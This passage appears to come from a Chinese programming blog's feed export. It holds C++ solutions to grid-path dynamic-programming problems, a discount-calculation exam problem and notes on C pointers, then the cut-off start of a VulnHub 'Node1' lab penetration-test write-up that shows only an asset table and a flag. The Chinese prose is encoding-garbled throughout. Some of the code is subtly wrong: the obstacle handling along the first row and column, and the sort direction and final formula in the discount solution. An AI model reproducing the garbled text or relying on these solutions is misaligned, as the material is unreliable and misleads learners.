class="built_in">path</span>(m,n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301112745113.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301112745113.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="éšœç¢ç‰©ç‰ˆä¸åŒè·¯å¾„"><a href="#éšœç¢ç‰©ç‰ˆä¸åŒè·¯å¾„" class="headerlink" title="éšœç¢ç‰©ç‰ˆä¸åŒè·¯å¾„"></a>éšœç¢ç‰©ç‰ˆä¸åŒè·¯å¾„</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301112906322.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301112906322.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é¦–å…ˆï¼Œæ€ä¹ˆè¾“å…¥å’Œä¼ å‚äºŒç»´æ•°ç»„ï¼Ÿ</p><p>ä¸èƒ½ç›´æ¥å‘æŸä¸ªå˜é‡cinäºŒç»´æ•°ç»„ï¼Œåªèƒ½å…ˆè¾“å…¥è¡Œå’Œåˆ—ï¼Œç„¶åå†é€ä¸ªè¾“å…¥ï¼Œä¼ å‚å°±ç”¨vectorï¼Œå› ä¸ºC++ä¼ å‚å®šé•¿ï¼Œä¸èƒ½ä½¿ç”¨<code>int[][] matrix</code>ï¼Œè€Œæ˜¯<code>int matrix[][3]</code>è¿™ç§ï¼Œä¸å¦‚ä½¿ç”¨vectoræ–¹ä¾¿</p><p>å…¶æ¬¡ï¼Œéšœç¢ç‰©ç‚¹åˆ°è¾¾å®ƒçš„è·¯å¾„æ¡æ•°ä¸º0ï¼Œå…¶ä½™æŒ‰ç…§ä¸Šä¸ªé¢˜ç›®è¿›è¡Œè®¡ç®—å³å¯</p><blockquote><p>ä¸èƒ½ç›´æ¥æŠŠæ•°ç»„ä¼ ç»™vectorï¼Œéœ€è¦å…ˆè¿›è¡Œç±»å‹è½¬æ¢ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[rows][cols] = &#123;&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†æ•°ç»„è½¬æ¢ä¸º std::vector</span></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; matrix;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; rows; ++i) &#123;</span><br><span class="line">        matrix.<span class="built_in">push_back</span>(<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="built_in">begin</span>(arr[i]), <span class="built_in">end</span>(arr[i])));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></blockquote><p>æ³¨æ„ï¼šdevC++çš„æ ‡å‡†æ— æ³•è¯»å–vectoråº“ï¼Œéœ€è¦åœ¨ç¼–è¯‘é€‰é¡¹-&gt;æ·»åŠ å‚æ•°â€â€“std&#x3D;c++11â€</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301154601417.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301154601417.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301154628495.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301154628495.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">path</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; block)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> m=block.<span class="built_in">size</span>(),n=block[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(block[i][j]==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j&gt;<span class="number">0</span>&amp;&amp;i&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                    dp[i][j]=dp[i<span class="number">-1</span>][j]+dp[i][j<span class="number">-1</span>];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    dp[i][j]=<span class="number">1</span>;<span class="comment">//ç¬¬ä¸€è¡Œæˆ–ç¬¬ä¸€åˆ—</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[i][j]=<span class="number">0</span>;<span class="comment">//æœ‰éšœç¢ç‰©</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> rows,cols;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;è¯·è¾“å…¥è¡Œæ•°å’Œåˆ—æ•°ï¼š&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;rows&gt;&gt;cols;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">block</span>(rows,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(cols));</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;è¯·ä¾æ¬¡è¾“å…¥çŸ©é˜µï¼š&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;rows;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;cols;j++)&#123;</span><br><span class="line">            cin&gt;&gt;block[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;å·¦ä¸Šåˆ°å³ä¸‹è·¯å¾„æ¡æ•°ä¸ºï¼š&quot;</span>&lt;&lt;<span class="built_in">path</span>(block);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç§’äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301154356385.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301154356385.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="æœ€å°è·¯å¾„å’Œ"><a href="#æœ€å°è·¯å¾„å’Œ" class="headerlink" title="æœ€å°è·¯å¾„å’Œ"></a>æœ€å°è·¯å¾„å’Œ</h3><p>å¤ªç»å…¸äº†ï¼Œå’Œå›å¤ç¥é¡ºåˆ©ä¸€æ ·ç»å…¸</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301155000648.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301155000648.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ ¹æ®ä¸Šä¸¤é“é¢˜ï¼Œä¸éš¾çŒœå‡ºæ¯ä¸ªä½ç½®çš„dpæœ€å°å€¼ä¸º<code>min(ä¸Šï¼Œå·¦)+æœ¬å—å€¼</code>ï¼Œç¬¬ä¸€è¡Œåˆ™åªèƒ½<code>å·¦+æœ¬å—å€¼</code>ï¼Œç¬¬ä¸€åˆ—åˆ™åªèƒ½<code>ä¸Š+æœ¬å—å€¼</code>ï¼Œç§’äº†</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">min</span><span class="params">(<span class="type">int</span> n,<span class="type">int</span> m)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&gt;m) <span class="keyword">return</span> m;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">path</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; block)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> m=block.<span class="built_in">size</span>(),n=block[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>]=block[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span>&amp;&amp;j==<span class="number">0</span>)&#123;</span><br><span class="line">                dp[i][j]=dp[i<span class="number">-1</span>][j]+block[i][j];<span class="comment">//ç¬¬ä¸€è¡Œ</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="keyword">if</span>(j&gt;<span class="number">0</span>&amp;&amp;i==<span class="number">0</span>)&#123;</span><br><span class="line">                dp[i][j]=dp[i][j<span class="number">-1</span>]+block[i][j];<span class="comment">//ç¬¬ä¸€åˆ—</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="keyword">if</span>(j&gt;<span class="number">0</span>&amp;&amp;i&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                dp[i][j]=<span class="built_in">min</span>(dp[i][j<span class="number">-1</span>],dp[i<span class="number">-1</span>][j])+block[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> rows,cols;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;è¯·è¾“å…¥è¡Œæ•°å’Œåˆ—æ•°ï¼š&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;rows&gt;&gt;cols;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">block</span>(rows,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(cols));</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;è¯·ä¾æ¬¡è¾“å…¥çŸ©é˜µï¼š&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;rows;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;cols;j++)&#123;</span><br><span class="line">            cin&gt;&gt;block[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;å·¦ä¸Šåˆ°å³ä¸‹æœ€çŸ­è·¯å¾„å’Œä¸ºï¼š&quot;</span>&lt;&lt;<span class="built_in">path</span>(block);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301161828856.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301161828856.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301161842319.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301161842319.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301161914523.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301161914523.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="other-æœºè¯•é¢˜"><a href="#other-æœºè¯•é¢˜" class="headerlink" title="other æœºè¯•é¢˜"></a>other æœºè¯•é¢˜</h2><h3 id="ä¸­å—å¤§ä¸Šæœºå‹è½´"><a href="#ä¸­å—å¤§ä¸Šæœºå‹è½´" class="headerlink" title="ä¸­å—å¤§ä¸Šæœºå‹è½´"></a>ä¸­å—å¤§ä¸Šæœºå‹è½´</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/506ec55b1cc642a7afb2c28c5d175ce8.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/506ec55b1cc642a7afb2c28c5d175ce8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ°´å°æ˜¯æˆ‘çš„CSDNå·</p><ul><li>æµ‹è¯•æ•°æ®ï¼š</li></ul><blockquote><p>3 500<br>0.6 100<br>0.8 200<br>0.7 100<br>è¾“å‡º 390</p></blockquote><p>â€‹é¦–å…ˆè¦å¯¹è¾“å…¥çš„æŠ˜æ‰£è¿›è¡Œæ’åºï¼Œä¼˜å…ˆä½¿ç”¨æ¯”ç‡ä½çš„zè¿›è¡Œæ”¯ä»˜ã€‚<br>â€‹ç„¶åç”¨lowcostè®°å½•ç›®å‰å¤šå°‘é’±æ˜¯æ‰“è¿‡æŠ˜çš„ã€‚T-lowcostå°±æ˜¯å‰©ä½™æ²¡æ‰“æŠ˜çš„ã€‚<br>â€‹æ¯æ¬¡å¾ªç¯ç”¨ä¸Šä¸€ä¸ªäººçš„æŠ˜æ‰£é¢åº¦ã€‚è‹¥æ‰€æœ‰äººæŠ˜æ‰£é¢åº¦ç›¸åŠ ä½äºæ€»ä»·ï¼Œåˆ™æœ€åå‰©çš„éƒ¨åˆ†å°±ä¸æ‰“æŠ˜</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">paychase</span><span class="params">(<span class="type">int</span> N,<span class="type">int</span> T,<span class="type">double</span> *z,<span class="type">int</span>* H)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> lowcost = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(T&lt;=lowcost+z[i]*H[i])&#123;</span><br><span class="line">T = lowcost + (T-lowcost)*H[i];</span><br><span class="line"><span class="keyword">return</span> T;</span><br><span class="line">&#125;<span class="comment">//èœå“æ€»ä»·å°äºæŠ˜æ‰£</span></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">lowcost = lowcost + z[i]*H[i];<span class="comment">//lowcostä¸ºå½“å‰æŠ˜æ‰£é™åº¦ï¼Œæ¯”å¦‚ç¬¬äºŒè½®ä¸­å°±æ˜¯0.6*100+0.8*200</span></span><br><span class="line">cout&lt;&lt;<span class="string">&quot;lowcost:&quot;</span>&lt;&lt;lowcost&lt;&lt;endl;</span><br><span class="line">T = T - H[i] + z[i]*H[i];<span class="comment">//æŠ˜æ‰£</span></span><br><span class="line">cout&lt;&lt;<span class="string">&quot;T:&quot;</span>&lt;&lt;T&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> N,T;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;è¯·è¾“å…¥äººæ•°å’Œèœå“æ€»ä»·ï¼š&quot;</span>&lt;&lt;endl;</span><br><span class="line">cin&gt;&gt;N&gt;&gt;T;</span><br><span class="line"><span class="type">double</span> z[N];</span><br><span class="line"><span class="type">int</span> H[N];</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;è¯·è¾“å…¥æ¯ä¸ªçš„æŠ˜æ‰£ç‡å’ŒæŠ˜æ‰£ä¸Šé™ï¼š&quot;</span>&lt;&lt;endl;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line"><span class="comment">//cout&lt;&lt;i&lt;&lt;endl;</span></span><br><span class="line">cin&gt;&gt;z[i]&gt;&gt;H[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j=i;j&lt;N;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(z[j]&gt;z[i])&#123;</span><br><span class="line"><span class="type">double</span> tempz;<span class="type">int</span> tempH;</span><br><span class="line">tempz=z[j];z[j]=z[i];z[i]=tempz;</span><br><span class="line">tempH=H[j];H[j]=H[i];H[i]=tempH;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="comment">//æŠ˜æ‰£æ’åº</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> cost = <span class="built_in">paychase</span>(N,T,z,H);</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;æœ¬æ¬¡ç”¨é¤æ€»èŠ±è´¹ï¼š&quot;</span>&lt;&lt;cost&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Cè¯­è¨€è€ƒç‚¹"><a href="#Cè¯­è¨€è€ƒç‚¹" class="headerlink" title="Cè¯­è¨€è€ƒç‚¹"></a>Cè¯­è¨€è€ƒç‚¹</h2><h4 id="æŒ‡é’ˆæ•°ç»„ï¼Œæ•°ç»„æŒ‡é’ˆ"><a href="#æŒ‡é’ˆæ•°ç»„ï¼Œæ•°ç»„æŒ‡é’ˆ" class="headerlink" title="æŒ‡é’ˆæ•°ç»„ï¼Œæ•°ç»„æŒ‡é’ˆ"></a>æŒ‡é’ˆæ•°ç»„ï¼Œæ•°ç»„æŒ‡é’ˆ</h4><p>åŒºåˆ†<code>int (*p)[3]</code>å’Œ<code> int *p[3]</code></p><ul><li>æŒ‡é’ˆæ•°ç»„ï¼š<code>int *p[3]</code>ï¼Œå®é™…ä¸Šæ˜¯ä¸ªæ•°ç»„ï¼Œåªæ˜¯é‡Œé¢å…ƒç´ éƒ½å­˜æ”¾çš„æŒ‡é’ˆï¼ŒæŒ‡é’ˆæŒ‡å‘intå‹å˜é‡åœ°å€ã€‚</li><li>æ•°ç»„æŒ‡é’ˆï¼š<code>int (*p)[3]</code>ï¼Œä¼˜å…ˆçº§<code>()</code>&gt;<code>[]</code>&gt;<code>*</code>ï¼Œå®é™…ä¸Šæ˜¯å®šä¹‰çš„ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªåŒ…å«ä¸‰ä¸ªæ•´æ•°çš„æ•°ç»„ã€‚</li></ul><h4 id="int-p"><a href="#int-p" class="headerlink" title="int **p"></a>int **p</h4><p><code>int **p</code>æ˜¯ä¸€ä¸ªæŒ‡é’ˆçš„æŒ‡é’ˆã€‚</p><h4 id="èµ‹å€¼åˆ¤æ–­"><a href="#èµ‹å€¼åˆ¤æ–­" class="headerlink" title="èµ‹å€¼åˆ¤æ–­"></a>èµ‹å€¼åˆ¤æ–­</h4><p><code>int *a=&amp;b</code>(âˆš)</p><p><code>int a=&amp;b</code>(Ã—)</p><p><code>int *a; a=&amp;b</code>(âˆš)</p><p>è®°ä½åªæœ‰æŒ‡é’ˆæ‰èƒ½å­˜åœ°å€ï¼Œæ•´å‹é‚£äº›éƒ½ä¸èƒ½å­˜åœ°å€ã€‚ä»¥åŠ<code>int *a</code>åï¼Œ*aæ‰æ˜¯å–å€¼ï¼Œaæ˜¯æŒ‡å‘çš„åœ°å€ã€‚</p><h4 id="æšä¸¾ç±»å‹ä¸­æ˜¯å¦å¯ä»¥ç”¨å°æ•°ï¼Ÿæšä¸¾ç±»å‹çš„å€¼èƒ½å¦ä¿®æ”¹ï¼Ÿ"><a href="#æšä¸¾ç±»å‹ä¸­æ˜¯å¦å¯ä»¥ç”¨å°æ•°ï¼Ÿæšä¸¾ç±»å‹çš„å€¼èƒ½å¦ä¿®æ”¹ï¼Ÿ" class="headerlink" title="æšä¸¾ç±»å‹ä¸­æ˜¯å¦å¯ä»¥ç”¨å°æ•°ï¼Ÿæšä¸¾ç±»å‹çš„å€¼èƒ½å¦ä¿®æ”¹ï¼Ÿ"></a>æšä¸¾ç±»å‹ä¸­æ˜¯å¦å¯ä»¥ç”¨å°æ•°ï¼Ÿæšä¸¾ç±»å‹çš„å€¼èƒ½å¦ä¿®æ”¹ï¼Ÿ</h4><p>ä¸å¯ä»¥ï¼Œä¸èƒ½ä¿®æ”¹</p><h4 id="ä¸å€ŸåŠ©ç¬¬ä¸‰ä¸ªå˜é‡ï¼Œäº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼"><a href="#ä¸å€ŸåŠ©ç¬¬ä¸‰ä¸ªå˜é‡ï¼Œäº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼" class="headerlink" title="ä¸å€ŸåŠ©ç¬¬ä¸‰ä¸ªå˜é‡ï¼Œäº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼"></a>ä¸å€ŸåŠ©ç¬¬ä¸‰ä¸ªå˜é‡ï¼Œäº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">5</span>, b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ç®—æœ¯è¿ç®—ç¬¦äº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼</span></span><br><span class="line">a = a + b;</span><br><span class="line">b = a - b;</span><br><span class="line">a = a - b;</span><br></pre></td></tr></table></figure><p>åæ–‡ä¼šæ›´å¯†ç å­¦å’ŒCæ˜“é”™ç‚¹è®°å½•</p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhubé¶æœºæ¸—é€Node1</title>
      <link href="/2023/06/30/vulnhub-ba-ji-node1/"/>
      <url>/2023/06/30/vulnhub-ba-ji-node1/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhubé¶æœºNode1"><a href="#vulnhubé¶æœºNode1" class="headerlink" title="vulnhubé¶æœºNode1"></a>vulnhubé¶æœºNode1</h1><h2 id="ä¸€ã€æœ‰æ•ˆèµ„äº§æ”¶é›†"><a href="#ä¸€ã€æœ‰æ•ˆèµ„äº§æ”¶é›†" class="headerlink" title="ä¸€ã€æœ‰æ•ˆèµ„äº§æ”¶é›†"></a>ä¸€ã€æœ‰æ•ˆèµ„äº§æ”¶é›†</h2><table><thead><tr><th>èµ„äº§ç¼–å·</th><th>èµ„äº§åˆ†ç±»</th><th>èµ„äº§åç§°</th><th>èµ„äº§è§„æ ¼</th><th>è®¿é—®åœ°å€</th><th>å¤‡æ³¨&#x2F;é—®é¢˜</th></tr></thead><tbody><tr><td>Node1</td><td>ä¸»æœºç³»ç»Ÿ</td><td>Ubuntuæ“ä½œç³»ç»Ÿ</td><td>Type:Linux<br />IP:192.168.101.137<br />Port:22ã€3000</td><td>192.168.101.137</td><td>è¶Šæƒï¼Œå‹ç¼©åŒ…çˆ†ç ´ï¼Œå†…æ ¸ææƒ</td></tr></tbody></table><p>flagï¼š</p><p>&#x3D;&#x3D;1722e99ca5f353b362556a62bd5e6be0&#x3D;&#x3D;</p><p>é¶æœºä¸‹è½½åœ°å€ï¼š<a href="https://www.vulnhub.com/entry/[](https://so.csdn.net/so/search?q=node&spm=1001.2101.3001.7020)-1,252/">https://www.vulnhub.com/entry/[](https://so.csdn.net/so/search?q=node&amp;spm=1001.2101.3001.7020)-1,252/</a></p><p>è®¿é—®ä¸åˆ°æŠŠç½‘ç»œæ¨¡å¼æ”¹ä¸ºNAT</p><h2 id="äºŒã€æ¸—é€æµ‹è¯•è¿‡ç¨‹"><a href="#äºŒã€æ¸—é€æµ‹è¯•è¿‡ç¨‹" class="headerlink" 